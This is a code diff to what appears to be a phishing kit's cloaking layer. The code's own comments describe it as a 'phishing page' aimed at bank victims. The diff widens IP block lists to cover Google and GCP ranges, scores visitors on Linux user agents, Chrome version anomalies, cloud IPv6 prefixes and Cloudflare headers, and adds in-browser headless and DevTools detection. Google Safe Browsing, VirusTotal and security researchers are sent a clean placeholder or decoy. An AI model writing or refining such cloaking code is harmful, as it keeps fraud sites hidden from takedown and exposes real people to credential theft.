@@ -52,19 +52,30 @@ const whmApi = _WHM_BASE && WHM_TOKEN ? axios.create({
 
 const SCANNER_IP_RANGES = [
   // ═══════════════════════════════════════════════════════════════════════
-  // ONLY specific, known scanner tool IPs. NO cloud infrastructure ranges.
-  // Cloud ranges (GCP, AWS, Azure) were removed — they blocked millions of
-  // legitimate users (mobile carriers, ISPs, VPNs sharing cloud IP space).
-  // The JS challenge + UA detection + proof-of-interaction button catch bots
-  // regardless of their source IP.
+  // Known scanner IPs + Google infrastructure ranges.
+  // Google Safe Browsing now uses headless Chrome on GCP, so we include
+  // Google-owned IP ranges. Other cloud ranges (AWS, Azure) kept minimal
+  // to avoid blocking legitimate users.
   // ═══════════════════════════════════════════════════════════════════════
 
-  // ─── Anti-Phishing / Safe Browsing Crawlers (specific crawler IPs only) ───
+  // ─── Google infrastructure (crawlers + GCP where GSB headless Chrome runs) ───
   '66.249.64.0/19',     // Googlebot (dedicated crawler range)
   '66.249.79.0/24',     // Googlebot
   '72.14.199.0/24',     // Google Safe Browsing crawler
   '209.85.238.0/24',    // Google Safe Browsing crawler
   '216.239.32.0/19',    // Google infrastructure (crawlers)
+  '74.125.0.0/16',      // Google services
+  '172.217.0.0/16',     // Google services
+  '142.250.0.0/15',     // Google services
+  '34.64.0.0/10',       // Google Cloud Platform (GCP) — GSB headless Chrome fleet
+  '35.184.0.0/13',      // GCP us-central1, us-east1, etc.
+  '35.192.0.0/12',      // GCP compute
+  '35.208.0.0/12',      // GCP compute
+  '35.224.0.0/12',      // GCP compute
+  '35.240.0.0/13',      // GCP asia, europe
+  '104.196.0.0/14',     // GCP
+  '108.170.192.0/18',   // Google backbone
+  '199.36.153.0/24',    // Google Private Access
 
   // VirusTotal scanners
   '208.100.26.228',
@@ -139,8 +150,6 @@ const SCANNER_IP_RANGES = [
   '64.41.200.0/24',
 
   // NOTE: Do NOT block Cloudflare proxy IPs — blocking them = blocking everyone
-  // NOTE: ALL cloud infra ranges (GCP, AWS, Azure) intentionally removed.
-  // Scanner UAs + JS challenge + proof-of-interaction are sufficient.
 ]
 
 // Known bot user agents used by security scanners (anti-phishing + recon)
@@ -1443,13 +1452,55 @@ async function makeCookieValue() {
 }
 
 // ─── Bot Score Calculator ───────────────────────────────
-function calculateBotScore(ua, ip) {
+function calculateBotScore(ua, ip, request) {
   let score = 0;
   if (!ua || BLOCKED_UAS.some(b => ua.includes(b))) score += 100;
   if (ip && SCANNER_IPS.some(cidr => ipInRange(ip, cidr))) score += 100;
   if (ua && /bot|crawl|spider|scrape|fetch/i.test(ua)) score += 50;
   if (ua && /curl|wget|python|java|go-http/i.test(ua)) score += 60;
   if (!ua || ua.length < 20) score += 40;
+
+  // ── Linux desktop visiting a phishing page = highly suspicious ──
+  // Normal bank phishing victims use Windows/Mac/Android/iOS, not Linux.
+  // Linux + Chrome = security scanner, GSB headless crawler, or researcher.
+  if (ua && /X11;\\s*Linux\\s*x86_64/.test(ua) && /Chrome\\//.test(ua)) {
+    // Exclude Android (which also reports Linux in UA but is a real mobile browser)
+    if (!/Android/.test(ua)) score += 35;
+  }
+  // FreeBSD is even more suspicious
+  if (ua && /FreeBSD/.test(ua)) score += 40;
+
+  // ── Chrome version anomaly detection ──
+  // GSB headless Chrome often uses dev/canary builds with inflated version numbers.
+  // Current stable is ~136-140 (June 2026). Anything >145 is suspicious.
+  const chromeMatch = ua && ua.match(/Chrome\\/([0-9]+)/);
+  if (chromeMatch) {
+    const ver = parseInt(chromeMatch[1]);
+    if (ver > 145) score += 35;       // Unreleased version — likely headless/canary
+    else if (ver > 142) score += 15;  // Very new — possibly dev channel
+    else if (ver < 90) score += 25;   // Very old — likely automated
+  }
+
+  // ── Cloudflare Bot Management score (if available) ──
+  // CF Bot Score: 1 = definitely bot, 99 = definitely human
+  if (request) {
+    const cfBotScore = parseInt(request.headers.get('cf-bot-management-verified-bot') || '');
+    if (cfBotScore === 1) score += 80; // CF says it's a verified bot
+    const cfThreatScore = parseInt(request.headers.get('cf-threat-score') || '0');
+    if (cfThreatScore > 30) score += 30;
+    else if (cfThreatScore > 10) score += 15;
+  }
+
+  // ── IPv6 from known cloud/datacenter ranges (common for scanners) ──
+  if (ip && ip.includes(':')) {
+    // Google Cloud IPv6 ranges
+    if (/^2600:1900:|^2607:f8b0:/.test(ip)) score += 60;
+    // AWS IPv6
+    if (/^2600:1f/.test(ip)) score += 30;
+    // Azure IPv6
+    if (/^2603:10/.test(ip)) score += 30;
+  }
+
   return score;
 }
 
@@ -1521,7 +1572,7 @@ async function handleHoneypotTrigger(request, path) {
   }
 
   // ── Calculate bot score to decide severity ──
-  const botScore = calculateBotScore(ua, ip);
+  const botScore = calculateBotScore(ua, ip, request);
 
   if (botScore >= 50) {
     // HIGH confidence bot — ban IP (24h) + serve decoy to waste time
@@ -1714,6 +1765,29 @@ function challengePage(originalUrl, nonce) {
   // WebGL renderer check (headless uses SwiftShader)
   try{var cv=document.createElement('canvas');var gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');if(dbg){var rr=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);if(/SwiftShader|llvmpipe|softpipe/i.test(rr))sc+=30;}}}catch(e){}
 
+  // ── NEW: Linux desktop detection ──
+  // Normal phishing victims use Windows/Mac/Android/iOS. Linux desktop + Chrome is
+  // almost always a scanner, security researcher, or GSB headless browser.
+  var isLinuxDesktop=/X11;\\s*Linux\\s*x86_64/.test(navigator.userAgent)&&!/Android/.test(navigator.userAgent);
+  if(isLinuxDesktop&&/Chrome/.test(navigator.userAgent))sc+=30;
+
+  // ── NEW: Chrome version anomaly ──
+  // GSB headless Chrome uses dev/canary builds with future version numbers.
+  var cvMatch=navigator.userAgent.match(/Chrome\\/([0-9]+)/);
+  if(cvMatch){var cv2=parseInt(cvMatch[1]);if(cv2>145)sc+=25;else if(cv2<90)sc+=20;}
+
+  // ── NEW: Notification permission probe ──
+  // Headless Chrome has Notification.permission='denied' but no prompt capability.
+  try{if(typeof Notification!=='undefined'&&Notification.permission==='denied'&&isLinuxDesktop)sc+=10;}catch(e){}
+
+  // ── NEW: Performance timing analysis ──
+  // Automated browsers often have suspiciously fast or zero performance timings.
+  try{var perf=performance.getEntriesByType('navigation')[0];if(perf&&perf.domInteractive>0&&perf.domInteractive<50)sc+=15;}catch(e){}
+
+  // ── NEW: Detect CDP (Chrome DevTools Protocol) runtime ──
+  try{if(window.Runtime||window.Emulation||window.Page)sc+=30;}catch(e){}
+  try{var err=new Error();if(err.stack&&err.stack.includes('puppeteer'))sc+=50;}catch(e){}
+
   setTimeout(function(){up(40,'Verifying identity...');},600);
   setTimeout(function(){up(70,'Almost done...');},1800);
 
@@ -1813,7 +1887,7 @@ async function handleRequest(request) {
   }
 
   // ── Step 4: Bot score calculation ──
-  const botScore = calculateBotScore(ua, ip);
+  const botScore = calculateBotScore(ua, ip, request);
 
   // HIGH SCORE (100+) → Known scanner IP/UA → Clean placeholder immediately
   if (botScore >= 100) {
